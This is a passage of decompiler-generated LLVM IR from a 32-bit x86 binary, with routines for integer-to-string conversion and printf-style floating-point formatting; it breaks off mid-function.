define i32 @function_8053ef4() local_unnamed_addr {
dec_label_pc_8053ef4:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053ef4 = load i32, i32* @ebx, align 4
  store i32 %v0_8053ef4, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8053ef9 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8053ef9, i32* %ebx.global-to-local, align 4
  %v4_8053efd = trunc i32 %tmp4 to i16
  %v6_8053f05 = icmp eq i32 %tmp6, 256
  %v1_8053f0b = icmp eq i1 %v6_8053f05, false
  br i1 %v1_8053f0b, label %dec_label_pc_8053f11, label %dec_label_pc_8053f0d

dec_label_pc_8053f0d:                             ; preds = %dec_label_pc_8053ef4
  %v2_8053f0d = trunc i32 %tmp4 to i8
  %v4_8053f0d = bitcast i16* %tmp5 to i8*
  store i8 %v2_8053f0d, i8* %v4_8053f0d, align 1
  br label %dec_label_pc_8053f2f

dec_label_pc_8053f11:                             ; preds = %dec_label_pc_8053ef4
  %v6_8053f11 = icmp eq i32 %tmp6, 2048
  %v1_8053f17 = icmp eq i1 %v6_8053f11, false
  br i1 %v1_8053f17, label %dec_label_pc_8053f20, label %dec_label_pc_8053f19

dec_label_pc_8053f19:                             ; preds = %dec_label_pc_8053f11
  %sext2 = mul i32 %tmp4, 65536
  %v1_8053f19 = sdiv i32 %sext2, 65536
  %v3_8053f19 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8053f19, i32* %v3_8053f19, align 4
  %v0_8053f1b = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f1b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053f1b = add i32 %v1_8053f1b, 4
  %v3_8053f1b = inttoptr i32 %v2_8053f1b to i32*
  store i32 %v0_8053f1b, i32* %v3_8053f1b, align 4
  br label %dec_label_pc_8053f2f

dec_label_pc_8053f20:                             ; preds = %dec_label_pc_8053f11
  %v6_8053f20 = icmp eq i32 %tmp6, 512
  %v1_8053f26 = icmp eq i1 %v6_8053f20, false
  br i1 %v1_8053f26, label %dec_label_pc_8053f2d, label %dec_label_pc_8053f28

dec_label_pc_8053f28:                             ; preds = %dec_label_pc_8053f20
  store i16 %v4_8053efd, i16* %tmp5, align 2
  br label %dec_label_pc_8053f2f

dec_label_pc_8053f2d:                             ; preds = %dec_label_pc_8053f20
  %sext3 = mul i32 %tmp4, 65536
  %v1_8053f2d = sdiv i32 %sext3, 65536
  %v3_8053f2d = bitcast i16* %tmp5 to i32*
  store i32 %v1_8053f2d, i32* %v3_8053f2d, align 4
  br label %dec_label_pc_8053f2f

dec_label_pc_8053f2f:                             ; preds = %dec_label_pc_8053f28, %dec_label_pc_8053f19, %dec_label_pc_8053f0d, %dec_label_pc_8053f2d
  %v2_8053f2f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053f2f, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8053f30 = sdiv i32 %sext, 65536
  ret i32 %v1_8053f30

; uselistorder directives
  uselistorder label %dec_label_pc_8053f2f, { 3, 0, 1, 2 }
}

define i32 @function_8053f34(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8053f34:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8053f3f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053f3f, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8053f4b = icmp slt i32 %arg4, 0
  %v1_8053f4d = icmp eq i1 %v2_8053f4b, false
  br i1 %v1_8053f4d, label %dec_label_pc_8053f6e, label %dec_label_pc_8053f4f

dec_label_pc_8053f4f:                             ; preds = %dec_label_pc_8053f34
  %v1_8053f4f = sub i32 0, %arg4
  store i32 %v1_8053f4f, i32* %esi.global-to-local, align 4
  %v2_8053f51 = icmp slt i32 %arg3, 0
  %v1_8053f53 = icmp eq i1 %v2_8053f51, false
  br i1 %v1_8053f53, label %dec_label_pc_8053f6e, label %dec_label_pc_8053f55

dec_label_pc_8053f55:                             ; preds = %dec_label_pc_8053f4f
  %v1_8053f55 = sub i32 0, %arg2
  %v5_8053f55 = icmp ne i32 %arg2, 0
  store i32 %v1_8053f55, i32* %ecx.global-to-local, align 4
  %v2_8053f57 = zext i1 %v5_8053f55 to i32
  %v3_8053f57 = add i32 %v2_8053f57, %arg3
  %v1_8053f62 = sub i32 0, %v3_8053f57
  store i32 %v1_8053f62, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053f6e

dec_label_pc_8053f6e:                             ; preds = %dec_label_pc_8053f34, %dec_label_pc_8053f4f, %dec_label_pc_8053f55
  %v0_8053f73 = phi i32 [ %v1_8053f4f, %dec_label_pc_8053f55 ], [ %v1_8053f4f, %dec_label_pc_8053f4f ], [ %arg4, %dec_label_pc_8053f34 ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8053f55 ], [ 0, %dec_label_pc_8053f4f ], [ 0, %dec_label_pc_8053f34 ]
  %div = udiv i32 -1, %v0_8053f73
  %tmp35 = urem i32 -1, %v0_8053f73
  %v1_8053f75 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_8053f79 = load i32, i32* %esi.global-to-local, align 4
  %v12_8053f79 = icmp eq i32 %v1_8053f75, %v1_8053f79
  %v1_8053f83 = icmp eq i1 %v12_8053f79, false
  br i1 %v1_8053f83, label %dec_label_pc_8053f92, label %dec_label_pc_8053f85

dec_label_pc_8053f85:                             ; preds = %dec_label_pc_8053f6e
  %v1_8053f85 = add i32 %div, 1
  br label %dec_label_pc_8053f92

dec_label_pc_8053f92:                             ; preds = %dec_label_pc_8053f6e, %dec_label_pc_8053f85
  %stack_var_-20.0.off0 = phi i32 [ %v1_8053f75, %dec_label_pc_8053f6e ], [ 0, %dec_label_pc_8053f85 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8053f6e ], [ %v1_8053f85, %dec_label_pc_8053f85 ]
  %v0_8053f92 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8053f92, i32* %ebp.global-to-local, align 4
  %v0_8053f94 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053f94, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053f9a

dec_label_pc_8053f9a:                             ; preds = %dec_label_pc_8053fd9, %dec_label_pc_8053f92
  %v0_8053fd1 = phi i32 [ %v0_8053fea, %dec_label_pc_8053fd9 ], [ %v0_8053f92, %dec_label_pc_8053f92 ]
  %v0_8053f9e = phi i32 [ %v1_8053fec, %dec_label_pc_8053fd9 ], [ %v0_8053f94, %dec_label_pc_8053f92 ]
  %v1_8053f9a = icmp eq i32 %v0_8053f9e, 0
  br i1 %v1_8053f9a, label %dec_label_pc_8053fd1, label %dec_label_pc_8053f9e

dec_label_pc_8053f9e:                             ; preds = %dec_label_pc_8053f9a
  %v0_8053fa2 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8053f9e, %v0_8053fa2
  %tmp36 = urem i32 %v0_8053f9e, %v0_8053fa2
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8053fd1, %v0_8053fa2
  %tmp37 = urem i32 %v0_8053fd1, %v0_8053fa2
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8053fb5 = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_8053fb9 = add i32 %tmp37, %v6_8053fb5
  %v8_8053fbf = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_8053fc4 = add i32 %div8, %v8_8053fbf
  store i32 %v2_8053fc4, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8053fb9, %v0_8053fa2
  %tmp38 = urem i32 %v2_8053fb9, %v0_8053fa2
  %v2_8053fcc = add i32 %div9, %v2_8053fc4
  br label %dec_label_pc_8053fd9

dec_label_pc_8053fd1:                             ; preds = %dec_label_pc_8053f9a
  %v0_8053fd5 = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_8053fd1, %v0_8053fd5
  %tmp39 = urem i32 %v0_8053fd1, %v0_8053fd5
  br label %dec_label_pc_8053fd9

dec_label_pc_8053fd9:                             ; preds = %dec_label_pc_8053f9e, %dec_label_pc_8053fd1
  %v0_8053fdf = phi i32 [ %tmp38, %dec_label_pc_8053f9e ], [ %tmp39, %dec_label_pc_8053fd1 ]
  %storemerge = phi i32 [ %v2_8053fcc, %dec_label_pc_8053f9e ], [ %div12, %dec_label_pc_8053fd1 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8053fd9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053fd9 = add i32 %v0_8053fd9, -1
  store i32 %v1_8053fd9, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_8053fdf, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_8053fdf
  %v8_8053fdf = trunc i32 %storemerge14.in to i8
  %v3_8053fe8 = inttoptr i32 %v1_8053fd9 to i8*
  store i8 %v8_8053fdf, i8* %v3_8053fe8, align 1
  %v0_8053fea = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053fec = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053fec = or i32 %v1_8053fec, %v0_8053fea
  %v3_8053fec = icmp eq i32 %v2_8053fec, 0
  %v1_8053fee = icmp eq i1 %v3_8053fec, false
  br i1 %v1_8053fee, label %dec_label_pc_8053f9a, label %dec_label_pc_8053ff0

dec_label_pc_8053ff0:                             ; preds = %dec_label_pc_8053fd9
  %v4_8053ff0 = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_8053ff0, label %dec_label_pc_8053ffb, label %dec_label_pc_8053ff7

dec_label_pc_8053ff7:                             ; preds = %dec_label_pc_8053ff0
  %v0_8053ff7 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053ff7 = add i32 %v0_8053ff7, -1
  store i32 %v1_8053ff7, i32* %edi.global-to-local, align 4
  %v1_8053ff8 = inttoptr i32 %v1_8053ff7 to i8*
  store i8 45, i8* %v1_8053ff8, align 1
  br label %dec_label_pc_8053ffb

dec_label_pc_8053ffb:                             ; preds = %dec_label_pc_8053ff0, %dec_label_pc_8053ff7
  %v0_8053ffe = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8053ffe

; uselistorder directives
  uselistorder i32 %v2_8053fb9, { 1, 0 }
  uselistorder i32 %v0_8053fa2, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8053f9e, { 1, 0, 2 }
  uselistorder i32 %v0_8053fd1, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8053f73, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053ffb, { 1, 0 }
  uselistorder label %dec_label_pc_8053fd9, { 1, 0 }
  uselistorder label %dec_label_pc_8053f92, { 1, 0 }
  uselistorder label %dec_label_pc_8053f6e, { 2, 1, 0 }
}

define i32 @function_8054008() local_unnamed_addr {
dec_label_pc_8054008:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp102 = call i16 @__decompiler_undefined_function_1()
  %tmp111 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054009 = load i32, i32* @edi, align 4
  %v0_805400a = load i32, i32* @esi, align 4
  %v0_805400b = load i32, i32* @ebx, align 4
  store i32 %v0_805400b, i32* %stack_var_-16, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v4_8054020 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8054020 = add i3 %v4_8054020, -1
  store i3 %v5_8054020, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054027 = add i32 %tmp111, 4
  %v2_8054027 = inttoptr i32 %v1_8054027 to i32*
  %v3_8054027 = load i32, i32* %v2_8054027, align 4
  store i32 %v3_8054027, i32* %eax.global-to-local, align 4
  %v1_805402e = add i32 %tmp111, 8
  %v2_805402e = inttoptr i32 %v1_805402e to i8*
  %v3_805402e = load i8, i8* %v2_805402e, align 1
  %v4_805402e = zext i8 %v3_805402e to i32
  %v5_805402e = load i32, i32* @ecx, align 4
  %v6_805402e = and i32 %v5_805402e, -256
  %v7_805402e = or i32 %v6_805402e, %v4_805402e
  store i32 %v7_805402e, i32* %ecx.global-to-local, align 4
  %v1_8054031 = inttoptr i32 %tmp111 to i32*
  %v2_8054031 = load i32, i32* %v1_8054031, align 4
  store i32 %v2_8054031, i32* %ebp.global-to-local, align 4
  %v3_8054033 = and i32 %v3_8054027, -256
  %v4_8054033 = or i32 %v3_8054033, %v4_805402e
  %v1_8054039 = or i32 %v4_8054033, 32
  %v3_8054039 = trunc i32 %v1_8054039 to i8
  store i32 %v1_8054039, i32* %eax.global-to-local, align 4
  %v10_8054044 = icmp eq i8 %v3_8054039, 97
  %v1_8054046 = icmp eq i1 %v10_8054044, false
  br i1 %v1_8054046, label %dec_label_pc_805404f, label %dec_label_pc_8054048

dec_label_pc_8054048:                             ; preds = %dec_label_pc_8054008
  %v1_8054048 = add i32 %v7_805402e, 6
  %v11_8054048 = trunc i32 %v1_8054048 to i8
  store i32 %v1_8054048, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805404f

dec_label_pc_805404f:                             ; preds = %dec_label_pc_8054008, %dec_label_pc_8054048
  %stack_var_-206.0 = phi i8 [ %v3_805402e, %dec_label_pc_8054008 ], [ %v11_8054048, %dec_label_pc_8054048 ]
  %v2_805404f = icmp slt i32 %v2_8054031, 0
  %v1_8054051 = icmp eq i1 %v2_805404f, false
  br i1 %v1_8054051, label %dec_label_pc_8054058, label %dec_label_pc_8054053

dec_label_pc_8054053:                             ; preds = %dec_label_pc_805404f
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054058

dec_label_pc_8054058:                             ; preds = %dec_label_pc_805404f, %dec_label_pc_8054053
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_8054067 = add i32 %tmp111, 12
  %v2_8054067 = inttoptr i32 %v1_8054067 to i32*
  %v3_8054067 = load i32, i32* %v2_8054067, align 4
  store i32 %v3_8054067, i32* %eax.global-to-local, align 4
  %v2_805406a = and i32 %v3_8054067, 2
  %v3_805406a = icmp eq i32 %v2_805406a, 0
  br i1 %v3_805406a, label %dec_label_pc_8054078, label %dec_label_pc_8054084

dec_label_pc_8054078:                             ; preds = %dec_label_pc_8054058
  %v2_8054078 = urem i32 %v3_8054067, 2
  %tmp144 = trunc i32 %v2_8054078 to i8
  %tmp = sub nsw i8 0, %tmp144
  %tmp145 = and i8 %tmp, 32
  br label %dec_label_pc_8054084

dec_label_pc_8054084:                             ; preds = %dec_label_pc_8054078, %dec_label_pc_8054058
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8054058 ], [ %tmp145, %dec_label_pc_8054078 ]
  %v1_8054098 = udiv i32 %v3_8054067, 256
  %tmp147 = and i32 %v1_8054098, 68
  %tmp148 = icmp eq i32 %tmp147, 64
  br i1 %tmp148, label %dec_label_pc_80541ea, label %dec_label_pc_805410a

dec_label_pc_805410a:                             ; preds = %dec_label_pc_8054084
  store i3 %v4_8054020, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp111, i32* %edx.global-to-local, align 4
  %v1_8054111 = add i32 %tmp111, 16
  %v2_8054111 = inttoptr i32 %v1_8054111 to i32*
  store i32 32, i32* %v2_8054111, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v2_805413c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805413c, i32* @ecx, align 4
  br label %dec_label_pc_805450f

dec_label_pc_80541ea:                             ; preds = %dec_label_pc_8054084
  %v1_80540a9 = add i3 %v4_8054020, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_80541ee = and i32 %v3_8054067, -65536
  %v2_80541f3 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_80541f3, i32* %edx.global-to-local, align 4
  %v1_80541fa = udiv i16 %tmp102, 256
  %v2_80541fa = zext i16 %v1_80541fa to i32
  %v3_80541fa = mul nuw nsw i32 %v2_80541fa, 256
  %tmp149 = urem i16 %tmp102, 256
  %v4_80541ee.masked = zext i16 %tmp149 to i32
  %v11_80541fa = or i32 %v4_80541ee.masked, %v3_80541fa
  %v10_80541fa = or i32 %v11_80541fa, %v6_80541ee
  %v12_80541fa = or i32 %v10_80541fa, 3072
  store i32 %v12_80541fa, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_80540a9, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805420e

dec_label_pc_805420e:                             ; preds = %dec_label_pc_805425f.dec_label_pc_805420e_crit_edge, %dec_label_pc_80541ea
  %v2_805422b = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_80541ea ], [ %v2_805422b.pre, %dec_label_pc_805425f.dec_label_pc_805420e_crit_edge ]
  %v1_805420e = phi i3 [ %v1_80540a9, %dec_label_pc_80541ea ], [ %v1_805420e.pre, %dec_label_pc_805425f.dec_label_pc_805420e_crit_edge ]
  %v3_8054235 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_80541ea ], [ %v0_805420e.pre, %dec_label_pc_805425f.dec_label_pc_805420e_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_80541f3, %dec_label_pc_80541ea ], [ %v4_8054230, %dec_label_pc_805425f.dec_label_pc_805420e_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp150 = fptosi x86_fp80 %v3_8054235 to i32
  store i32 %tmp150, i32* %eax.global-to-local, align 4
  store i32 %tmp150, i32* %ebx.global-to-local, align 4
  %v5_8054228 = sitofp i32 %tmp150 to x86_fp80
  %v4_805422b = fsub x86_fp80 %v2_805422b, %v5_8054228
  store i3 %v1_805420e, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054230 = add i32 %stack_var_-212.0, 9
  %v4_8054235 = fmul x86_fp80 %v3_8054235, %v4_805422b
  store x86_fp80 %v4_8054235, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054237

dec_label_pc_8054237:                             ; preds = %dec_label_pc_8054237.dec_label_pc_8054237_crit_edge, %dec_label_pc_805420e
  %v0_8054249 = phi i32 [ %v0_8054249.pre, %dec_label_pc_8054237.dec_label_pc_8054237_crit_edge ], [ %tmp150, %dec_label_pc_805420e ]
  %v0_8054237 = phi i32 [ %v0_8054237.pre, %dec_label_pc_8054237.dec_label_pc_8054237_crit_edge ], [ 0, %dec_label_pc_805420e ]
  %v1_8054237 = add i32 %v0_8054237, 1
  store i32 %v1_8054237, i32* %esi.global-to-local, align 4
  %v2_805423c = sub i32 %v4_8054230, %v1_8054237
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_8054249, 10
  %tmp135 = urem i32 %v0_8054249, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_805423c, i32* %eax.global-to-local, align 4
  %v1_8054255 = or i32 %tmp135, 48
  %v8_8054255 = trunc i32 %v1_8054255 to i8
  store i32 %v1_8054255, i32* %edx.global-to-local, align 4
  %v3_805425b = inttoptr i32 %v2_805423c to i8*
  store i8 %v8_8054255, i8* %v3_805425b, align 1
  %v7_805425d = icmp sgt i32 %v1_8054237, 8
  br i1 %v7_805425d, label %dec_label_pc_805425f, label %dec_label_pc_8054237.dec_label_pc_8054237_crit_edge

dec_label_pc_8054237.dec_label_pc_8054237_crit_edge: ; preds = %dec_label_pc_8054237
  %v0_8054237.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8054249.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054237

dec_label_pc_805425f:                             ; preds = %dec_label_pc_8054237
  %v0_805425f = load i32, i32* @edi, align 4
  %v1_805425f = add i32 %v0_805425f, 1
  store i32 %v1_805425f, i32* @edi, align 4
  %v7_8054263 = icmp sgt i32 %v1_805425f, 2
  br i1 %v7_8054263, label %dec_label_pc_8054265, label %dec_label_pc_805425f.dec_label_pc_805420e_crit_edge

dec_label_pc_805425f.dec_label_pc_805420e_crit_edge: ; preds = %dec_label_pc_805425f
  %v0_805420e.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805420e.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_805422b.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805420e

dec_label_pc_8054265:                             ; preds = %dec_label_pc_805425f
  %v0_8054265 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054265 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8054265, x86_fp80* %st0.global-to-local, align 4
  %v2_8054267 = add i3 %v0_8054265, 2
  store i3 %v2_8054267, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054269 = add i8 %stack_var_-206.0, -96
  %v6_8054269 = sub i8 95, %stack_var_-206.0
  %v7_8054269 = and i8 %v6_8054269, %stack_var_-206.0
  %v8_8054269 = icmp slt i8 %v7_8054269, 0
  %v9_8054269 = icmp eq i8 %v4_8054269, 0
  %v10_8054269 = icmp slt i8 %v4_8054269, 0
  %v3_805426e = icmp eq i1 %v10_8054269, %v8_8054269
  %v4_805426e = icmp eq i1 %v9_8054269, false
  %v5_805426e = and i1 %v4_805426e, %v3_805426e
  %v4_8054270 = add i8 %stack_var_-206.0, 32
  %.143 = select i1 %v5_805426e, i32 101, i32 69
  %stack_var_-206.0.v4_8054270 = select i1 %v5_805426e, i8 %stack_var_-206.0, i8 %v4_8054270
  %v12_805427d = icmp eq i8 %stack_var_-206.0.v4_8054270, 103
  %v1_8054282 = icmp eq i1 %v12_805427d, false
  br i1 %v1_8054282, label %dec_label_pc_805428b, label %dec_label_pc_8054284

dec_label_pc_8054284:                             ; preds = %dec_label_pc_8054265
  %v0_8054284 = load i32, i32* %ebp.global-to-local, align 4
  %tmp136 = icmp slt i32 %v0_8054284, 1
  br i1 %tmp136, label %dec_label_pc_8054292, label %dec_label_pc_8054288

dec_label_pc_8054288:                             ; preds = %dec_label_pc_8054284
  %v1_8054288 = add i32 %v0_8054284, -1
  store i32 %v1_8054288, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054292

dec_label_pc_805428b:                             ; preds = %dec_label_pc_8054265
  %v12_805428b = icmp eq i8 %stack_var_-206.0.v4_8054270, 102
  br i1 %v12_805428b, label %dec_label_pc_8054296, label %dec_label_pc_805428b.dec_label_pc_8054292_crit_edge

dec_label_pc_805428b.dec_label_pc_8054292_crit_edge: ; preds = %dec_label_pc_805428b
  %v0_8054292.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054292

dec_label_pc_8054292:                             ; preds = %dec_label_pc_805428b.dec_label_pc_8054292_crit_edge, %dec_label_pc_8054284, %dec_label_pc_8054288
  %v0_8054292 = phi i32 [ %v0_8054292.pre, %dec_label_pc_805428b.dec_label_pc_8054292_crit_edge ], [ %v0_8054284, %dec_label_pc_8054284 ], [ %v1_8054288, %dec_label_pc_8054288 ]
  store i32 %v0_8054292, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80542c3

dec_label_pc_8054296:                             ; preds = %dec_label_pc_805428b
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_805429a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805429a = add i32 %v0_805429a, -1
  store i32 %v2_805429a, i32* %ebx.global-to-local, align 4
  %v5_80542a1 = icmp slt i32 %v2_805429a, -1
  br i1 %v5_80542a1, label %dec_label_pc_80542a3, label %dec_label_pc_80542c3

dec_label_pc_80542a3:                             ; preds = %dec_label_pc_8054296
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80542ab = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80542ab, i32* %eax.global-to-local, align 4
  %v4_80542b3 = bitcast i32* %stack_var_-72 to i8*
  %v5_80542b3 = call i32 @function_805143c(i8* %v4_80542b3, i32 48, i32 21)
  store i32 %v5_80542b3, i32* %eax.global-to-local, align 4
  %v0_80542d3.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80542c3

dec_label_pc_80542c3:                             ; preds = %dec_label_pc_8054296, %dec_label_pc_80542a3, %dec_label_pc_8054292
  %v1_80542e3 = phi i32 [ %v0_8054292, %dec_label_pc_8054292 ], [ %v0_80542d3.pr.pre, %dec_label_pc_80542a3 ], [ %v2_805429a, %dec_label_pc_8054296 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_80542d6 = icmp sgt i32 %v1_80542e3, 20
  br i1 %v7_80542d6, label %dec_label_pc_80542d8, label %dec_label_pc_80542e3

dec_label_pc_80542d8:                             ; preds = %dec_label_pc_80542c3
  %v2_80542d8 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_80542d8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80542f7.preheader

dec_label_pc_80542e3:                             ; preds = %dec_label_pc_80542c3
  %v0_80542e3 = load i32, i32* @esp, align 4
  %v2_80542e3 = add i32 %v1_80542e3, 165
  %v3_80542e3 = add i32 %v2_80542e3, %v0_80542e3
  store i32 %v3_80542e3, i32* %eax.global-to-local, align 4
  %v1_80542ea = add i32 %v3_80542e3, 2
  store i32 %v1_80542ea, i32* %ecx.global-to-local, align 4
  %v2_80542ed = inttoptr i32 %v1_80542ea to i8*
  %v3_80542ed = load i8, i8* %v2_80542ed, align 1
  %v4_80542ed = add i8 %v3_80542ed, -53
  %v9_80542ed = sub i8 52, %v3_80542ed
  %v10_80542ed = and i8 %v9_80542ed, %v3_80542ed
  %v11_80542ed = icmp slt i8 %v10_80542ed, 0
  %v13_80542ed = icmp slt i8 %v4_80542ed, 0
  %v2_80542f1 = icmp eq i1 %v13_80542ed, %v11_80542ed
  %v3_80542f1 = zext i1 %v2_80542f1 to i32
  br label %dec_label_pc_80542f7.preheader

dec_label_pc_80542f7.preheader:                   ; preds = %dec_label_pc_80542e3, %dec_label_pc_80542d8
  %v0_80542f762 = phi i32 [ %v1_80542ea, %dec_label_pc_80542e3 ], [ %v2_80542d8, %dec_label_pc_80542d8 ]
  %storemerge51 = phi i32 [ %v3_80542f1, %dec_label_pc_80542e3 ], [ 0, %dec_label_pc_80542d8 ]
  store i32 %storemerge51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80542f7

dec_label_pc_80542f7:                             ; preds = %dec_label_pc_80542f7.backedge, %dec_label_pc_80542f7.preheader
  %v3_80542f8 = phi i32 [ %v3_80542f8.pre, %dec_label_pc_80542f7.backedge ], [ %storemerge51, %dec_label_pc_80542f7.preheader ]
  %v0_80542f7 = phi i32 [ %v0_80542fa, %dec_label_pc_80542f7.backedge ], [ %v0_80542f762, %dec_label_pc_80542f7.preheader ]
  %v1_80542f7 = add i32 %v0_80542f7, -1
  store i32 %v1_80542f7, i32* %ecx.global-to-local, align 4
  %v1_80542f8 = inttoptr i32 %v1_80542f7 to i8*
  %v2_80542f8 = load i8, i8* %v1_80542f8, align 1
  %v4_80542f8 = trunc i32 %v3_80542f8 to i8
  %v5_80542f8 = add i8 %v2_80542f8, %v4_80542f8
  store i8 %v5_80542f8, i8* %v1_80542f8, align 1
  %v0_80542fa = load i32, i32* %ecx.global-to-local, align 4
  %v1_80542fa = inttoptr i32 %v0_80542fa to i8*
  %v2_80542fa = load i8, i8* %v1_80542fa, align 1
  %v3_80542fa = zext i8 %v2_80542fa to i32
